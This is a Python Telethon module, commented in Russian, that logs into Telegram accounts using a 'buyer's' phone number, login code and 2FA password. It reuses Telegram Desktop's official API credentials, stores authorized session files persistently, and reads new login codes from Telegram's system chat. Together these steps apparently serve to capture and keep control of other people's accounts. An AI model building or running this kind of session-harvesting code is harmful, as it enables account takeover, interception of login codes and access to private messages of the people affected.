"""
userbot.py — юзербот на Telethon.

Использует официальные API credentials от Telegram Desktop.
Сессии хранятся в папке sessions/ — каждый номер = отдельный файл.
После первого входа повторная авторизация не нужна.
"""

import os
import re
import logging

logger = logging.getLogger(__name__)

# ── ОФИЦИАЛЬНЫЕ API CREDENTIALS (Telegram Desktop) ──────────
USERBOT_API_ID   = 2040
USERBOT_API_HASH = "b18441a1ff607e10a989891a5462e627"
# ────────────────────────────────────────────────────────────

SESSIONS_DIR   = "sessions"
TG_CODE_SENDER = 42777  # системный аккаунт Telegram — сюда приходят коды

os.makedirs(SESSIONS_DIR, exist_ok=True)

# Активные клиенты: session_id -> TelegramClient
_clients: dict = {}

# phone_code_hash для sign_in: phone -> hash
_pending_hashes: dict = {}


def _session_path(phone: str) -> str:
    clean = phone.replace("+", "").replace(" ", "")
    return os.path.join(SESSIONS_DIR, clean)


async def request_code(phone: str) -> bool:
    """
    Запросить отправку кода на номер покупателя.
    Telegram пришлёт код в чат 42777.
    Вызывать сразу после того как покупатель ввёл номер.
    """
    try:
        from telethon import TelegramClient

        client = TelegramClient(
            _session_path(phone),
            USERBOT_API_ID,
            USERBOT_API_HASH
        )
        await client.connect()

        if await client.is_user_authorized():
            await client.disconnect()
            return True

        result = await client.send_code_request(phone)
        _pending_hashes[phone] = result.phone_code_hash
        await client.disconnect()
        return True

    except Exception as e:
        logger.error(f"request_code error for {phone}: {e}")
        return False


async def login_with_code(phone: str, code: str, session_id: int) -> str:
    """
    Войти с кодом из чата 42777.

    Возвращает:
      "ok"           — вход выполнен
      "need_2fa"     — требуется пароль 2FA
      "wrong_code"   — неверный или истёкший код
      "error"        — другая ошибка
    """
    try:
        from telethon import TelegramClient
        from telethon.errors import (
            SessionPasswordNeededError,
            PhoneCodeInvalidError,
            PhoneCodeExpiredError,
        )

        client = TelegramClient(
            _session_path(phone),
            USERBOT_API_ID,
            USERBOT_API_HASH
        )
        await client.connect()

        if await client.is_user_authorized():
            _clients[session_id] = client
            return "ok"

        phone_code_hash = _pending_hashes.get(phone)
        if not phone_code_hash:
            logger.error(f"No phone_code_hash for {phone}")
            await client.disconnect()
            return "error"

        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            _clients[session_id] = client
            _pending_hashes.pop(phone, None)
            return "ok"

        except SessionPasswordNeededError:
            _clients[session_id] = client
            return "need_2fa"

        except (PhoneCodeInvalidError, PhoneCodeExpiredError):
            await client.disconnect()
            return "wrong_code"

    except Exception as e:
        logger.error(f"login_with_code error: {e}")
        return "error"


async def submit_2fa(phone: str, password: str, session_id: int) -> str:
    """
    Войти с паролем 2FA.
    Возвращает: "ok" | "wrong_password" | "error"
    """
    try:
        from telethon.errors import PasswordHashInvalidError

        client = _clients.get(session_id)
        if not client:
            return "error"

        if not client.is_connected():
            await client.connect()

        try:
            await client.sign_in(password=password)
            return "ok"
        except PasswordHashInvalidError:
            return "wrong_password"

    except Exception as e:
        logger.error(f"submit_2fa error: {e}")
        return "error"


async def get_last_tg_code(session_id: int) -> dict | None:
    """
    Прочитать последний код из чата 42777.
    Возвращает {"code": "12345", "time": "14:32:01"} или None.
    """
    try:
        client = _clients.get(session_id)
        if not client:
            return None

        if not client.is_connected():
            await client.connect()

        messages = await client.get_messages(TG_CODE_SENDER, limit=5)

        for msg in messages:
            if not msg.text:
                continue
            match = re.search(r'\b(\d{5})\b', msg.text)
            if match:
                code = match.group(1)
                msg_time = msg.date.strftime("%H:%M:%S") if msg.date else "—"
                return {"code": code, "time": msg_time, "text": msg.text[:120]}

        return None

    except Exception as e:
        logger.error(f"get_last_tg_code error: {e}")
        return None


async def disconnect_session(session_id: int):
    """Отключить сессию после завершения верификации."""
    client = _clients.pop(session_id, None)
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass
